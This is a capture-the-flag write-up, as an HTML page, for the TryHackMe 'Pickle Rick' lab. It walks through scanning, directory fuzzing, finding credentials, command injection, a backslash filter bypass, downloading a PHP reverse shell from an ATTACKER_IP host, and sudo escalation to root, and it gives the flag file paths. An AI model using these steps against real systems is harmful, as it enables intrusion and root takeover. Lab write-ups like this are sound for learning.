@@ -1,0 +1,146 @@
+<title>TryHackMe - Pickle Rick (Easy)</title>
+<header>
+  <div class="header">
+    <div class="titleContainer">
+      <img class="headerIcon" src="/write-ups/TryHackMe/Easy/Pickle Rick/icon.jpg"/>
+      <p class="mainTitle">TryHackMe - Pickle Rick (Easy)</p>
+    </div>
+  </div>
+</header>
+<div class="writeUp">
+    <h1 id="table-of-contents">Table of contents</h1>
+    <nav id="tableOfContents" class="tableOfContents">
+    </nav>
+    <h1 id="reconnaissance">Reconnaissance</h1>
+    <h2 id="nmap-scan">Nmap scan</h2>
+    <div class="codeBlock"># Nmap 7.92 scan initiated Fri Aug 19 23:14:31 2022 as: nmap -A -p- -oN nmapResults.txt 10.10.99.97
+Nmap scan report for 10.10.99.97
+Host is up (0.028s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 66:c4:52:9e:e4:3a:d7:d1:cb:3f:d7:0e:e6:09:82:6e (RSA)
+|_  256 3c:31:4a:49:af:7d:8e:75:70:40:db:04:69:d5:18:e6 (ECDSA)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Rick is sup4r cool
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Aug 19 23:14:48 2022 -- 1 IP address (1 host up) scanned in 17.18 seconds</div>
+    <h2 id="manual-website-reconnaissance">Manual website reconnaissance</h2>
+    <p>If we go to the index page of the website, we can see that Rick is talking about a password that he forgot.</p>
+    <img src="/write-ups/TryHackMe/Easy/Pickle Rick/image1.jpg"/>
+    <p>Looking at the source code of the page, we can see that Rick left a comment containing a username.</p>
+    <img src="/write-ups/TryHackMe/Easy/Pickle Rick/image2.png"/>
+    <p>So now we have a username : <code>R1ckRul3s</code></p>
+    <p>
+        One of the first things I look for when I'm enumerating a website is the <code>robot.txt</code> file. So let's see if there is a 
+        <code>robot.txt</code> file on this web server.
+    </p>
+    <img src="/write-ups/TryHackMe/Easy/Pickle Rick/image3.png"/>
+    <p>
+        And we found a strange looking strings. It's not a page of the webserver so maybe it's the password that Rick lost ? Let's write it 
+        down somewhere for the moment.
+    </p>
+    <h2 id="fuzzing">Fuzzing</h2>
+    <p>
+        First I tried a simple dirb scan but it didn't found any interesting pages, so I decided to try using the <code>-X</code> parameter to 
+        search for page with extensions like so : <code>dirb http://10.10.99.97/ -X .php</code> :
+    </p>
+    <div class="codeBlock">┌──(attacker㉿AttackBox)-[~/Bureau/CTF/Pickle_Rick]
+└─$ dirb http://10.10.99.97/ -X .php     
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Aug 19 23:20:38 2022
+URL_BASE: http://10.10.99.97/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.99.97/ ----
++ http://10.10.99.97/denied.php (CODE:302|SIZE:0)
++ http://10.10.99.97/login.php (CODE:200|SIZE:882)</div>
+    <p>And we found a <code>login.php</code> page ! (The <code>denied.php</code> page redirects us to <code>login.php</code>).</p>
+    <h2 id="more-web-reconnaissance">More web reconnaissance</h2>
+    <p>So let's go to this page and try to login with the informations we gathered :</p>
+    <img src="/write-ups/TryHackMe/Easy/Pickle Rick/image4.png"/>
+    <p>Using <code>R1ckRul3s</code> as login and <code>Wubbalubbadubdub</code> as password, we are redirected to a <code>portal.php</code> page.</p>
+    <img src="/write-ups/TryHackMe/Easy/Pickle Rick/image5.png"/>
+    <p>
+        We cannot access any pages using the menu on top of the page. But here we have an input field that seems to be used to run 
+        commands. So let's try using <code>whoami</code> :
+    </p>
+    <img src="/write-ups/TryHackMe/Easy/Pickle Rick/image6.png"/>
+    <p>We see that we can run linux commands, so we can try to use some other commands.</p>
+    <h1 id="initial-access">Initial access</h1>
+    <h2 id="bypass-filters">Bypass filters</h2>
+    <p>
+        I tried some useful commands and I was able to run <code>ls</code>, <code>wget</code>, <code>sudo -l</code> and <code>cat</code>, but 
+        there is some filters that prevent us from using some commands , like for cat. We can easily bypass those filters by just putting a 
+        <code>\</code> inside the command, like so : <code>c\at file</code>.
+    </p>
+    <p>
+        Now we have multiple choices. We can either just find the different flags using this command input or obtain a 
+        reverse shell. I will try to get a reverse shell since it will be more easier to search for files on the machine.
+    </p>
+    <p>
+        Like I said, we can use <code>sudo -l</code>. Let's see if <code>www-data</code> can run any command as <code>root</code> that could 
+        be leveraged to obtain a root shell :
+    </p>
+    <img src="/write-ups/TryHackMe/Easy/Pickle Rick/image7.png"/>
+    <p>As we can see, <code>www-data</code> can run any commands as <code>root</code>, without providing a password.</p>
+    <h2 id="getting-a-shell">Getting a shell</h2>
+    <p>
+        I tried to download a reverse shell to the machine using <code>wget</code>, but it didn't work, because <code>www-data</code> don't 
+        have write premissions on <code>/var/www/html</code>. So I just ran the same command as <code>root</code> like so : 
+        <code>sudo wget &lt;ATTACKER_IP&gt;/php-reverse-shell.php</code>.
+    </p>
+    <p>
+        Then I just set up a netcat listener on my machine, I entered 
+        <code>http://&lt;ATTACKER_IP&gt;/php-reverse-shell.php</code> in the URL of my web browser, and I got a reverse shell. Now I can just 
+        run <code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code> and then <code>sudo su</code> to get a shell as root.
+    </p>
+    <h1 id="post-exploitation">Post-exploitation</h1>
+    <h2 id="finding-flags">Finding flags</h2>
+    <p>Now I can get the 3 flags (ingredients for the potion that Rick needs) :</p>
+    <p>
+        What is the first ingredient Rick needs ? : <code>cat /var/www/html/Sup3rS3cretPickl3Ingred.txt</code><br>
+        Whats the second ingredient Rick needs ? : <code>cat /home/rick/second\ ingredients</code><br>
+        Whats the final ingredient Rick needs ? : <code>cat /root/3rd.txt</code>
+    </p>
+    <h1 id="tools-used">Tools used</h1>
+    <table>
+        <thead>
+            <tr>
+                <th>Tool</th>
+                <th>Purpose</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td><a href="https://nmap.org/">Nmap</a></td>
+                <td>
+                    - Scan for open ports<br>
+                    - Scan services version
+                </td>
+            </tr>
+            <tr>
+                <td><a href="https://www.kali.org/tools/dirb/">dirb</a></td>
+                <td>Perform directory fuzzing</td>
+            </tr>
+        </tbody>
+    </table>
+    <h1 id="sources">Sources</h1>
+    <ul>
+        <li>HackTricks bypass bash restrictions : <a hre="https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions">https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions</a></li>
+    </ul>
+</div>
